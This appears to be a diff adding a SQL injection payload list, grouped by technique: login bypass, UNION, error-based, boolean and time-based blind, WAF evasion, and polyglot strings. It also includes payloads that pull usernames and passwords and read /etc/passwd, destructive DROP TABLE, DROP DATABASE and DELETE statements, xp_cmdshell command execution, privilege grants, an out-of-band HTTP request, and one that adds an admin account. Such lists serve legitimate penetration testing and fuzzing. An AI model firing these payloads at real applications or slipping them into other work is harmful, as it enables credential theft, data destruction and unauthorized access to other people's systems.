@@ -1,0 +1,83 @@
+-- Authentication Bypass
+-- These payloads exploit SQL authentication bypass vulnerabilities
+' OR '1'='1' --
+" OR "1"="1" --
+admin' --
+admin'/*
+' OR 1=1 LIMIT 1 -- -
+
+-- Union-Based SQL Injection
+-- These payloads use UNION SELECT to retrieve database information
+' UNION SELECT 1,2,3 --
+' UNION SELECT null,null,null --
+' UNION SELECT username,password FROM users --
+' UNION SELECT 1,@@version,3 --
+' UNION SELECT 1,database(),user() --
+
+-- Error-Based SQL Injection
+-- These payloads leverage database error messages to extract information
+' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --
+
+-- Boolean-Based SQL Injection
+-- These payloads rely on evaluating true/false conditions
+' AND 1=1 --
+' AND 1=0 --
+1' AND 'a'='a --
+
+-- Time-Based Blind SQL Injection
+-- These payloads introduce delays to infer database responses
+' OR IF(1=1, SLEEP(5), 0) --
+' OR IF(1=0, SLEEP(5), 0) --
+1 AND (SELECT IF(1=1, SLEEP(5), 0)) --
+
+-- WAF Bypass & Obfuscation
+-- These payloads attempt to evade Web Application Firewalls (WAFs)
+'UnIoN SeLeCt 1,2,3 --
+'/**/UNION/**/SELECT/**/1,2,3 --
+' OR 'x'='x'--
+' || 'x'='x' --
+
+-- Extracting Database Information
+-- These payloads retrieve database details
+' UNION SELECT 1, database(), version() --
+' UNION SELECT table_name FROM information_schema.tables --
+
+-- Extracting User Data
+-- These payloads retrieve user credentials or system user information
+' UNION SELECT username,password FROM users --
+' UNION SELECT user() --
+' UNION SELECT LOAD_FILE('/etc/passwd') --
+
+-- Dropping Tables (Dangerous - Use with Caution)
+-- These payloads delete critical database tables
+DROP TABLE users; --
+DROP DATABASE mydb; --
+DELETE FROM users WHERE '1'='1'; --
+
+-- Advanced Polyglot SQL Injection
+-- These complex payloads combine multiple techniques
+' OR 1=1 UNION SELECT 1,@@version,database() --
+' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --
+1' or '1'='1
+1 or 1=1
+' or 'x'='x'
+' or 1=1--
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+' grant connect to name; grant resource to name; --
+' union (select @@version) --
+' union (select NULL, NULL, (select @@version)) --
+' union (select NULL, NULL, NULL, (select @@version)) --
+1' and 1=(select count(*) from tablenames); --
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+
+-- Miscellaneous
+-- Other payloads that could be useful for exploitation
+1;SELECT *
+1 waitfor delay '0:0:10'--
+' or username is not NULL or username = '
+' or 'text' = n'text'
+' or uid like '%
+' or user like '%
+' or username like '%
+' ||utl_http.request('httP://192.168.1.1/')||'
+' || myappadmin.adduser('admin', 'newpass') || '
